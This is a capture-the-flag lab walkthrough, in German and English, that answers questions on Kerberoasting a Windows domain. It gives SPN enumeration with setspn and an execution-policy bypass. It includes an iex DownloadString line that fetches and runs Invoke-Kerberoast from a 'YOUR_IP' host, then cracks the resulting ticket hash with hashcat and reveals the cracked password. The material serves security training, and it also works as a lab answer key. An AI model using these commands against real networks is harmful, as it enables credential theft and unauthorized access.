Kerberos ist ein Authentifizierungsprotokoll, das in Windows-Netzwerken verwendet wird, um Benutzer zu identifizieren und deren Zugriff auf Ressourcen zu verwalten. Es ermöglicht eine sichere Authentifizierung, indem es Tickets verwendet, die von einem zentralen Dienst ausgestellt werden.

Kerberoasting ist eine Angriffstechnik, die auf Schwachstellen in der Art und Weise basiert, wie Kerberos Tickets für bestimmte Dienste verschlüsselt sind. Ein Angreifer kann versuchen, einen speziellen Art von Ticket zu "ernten", der es ihm ermöglicht, das Passwort eines Dienstkontos offline zu knacken.

Answer the questions below
---

1. Lets first enumerate Windows. If we run setspn -T medin -Q ​ */* we can extract all accounts in the SPN.

    SPN is the Service Principal Name, and is the mapping between service and account.

    Running that command, we find an existing SPN. What user is that for?

    **fela**

2. Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.

    Lets first download the Powershell [Invoke-Kerberoast](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1).

        powershell -ep bypass;

        iex​(New-Object Net.WebClient).DownloadString('https://YOUR_IP/Kerberoast.ps1') 

    Now lets load this into memory: Invoke-Kerberoast -OutputFormat hashcat ​ |fl

    You should get a SPN ticket.

3. Lets use hashcat to bruteforce this password. The type of hash we're cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.

    hashcat -m 13100 -​a 0 hash.txt wordlist --force

    Crack the hash. What is the users password in plain text?

    **ruben124**

4. Login as this user. What is his flag?

    **flag{xxxxxxxxxxxxxxxxxxxxxxxxxx}**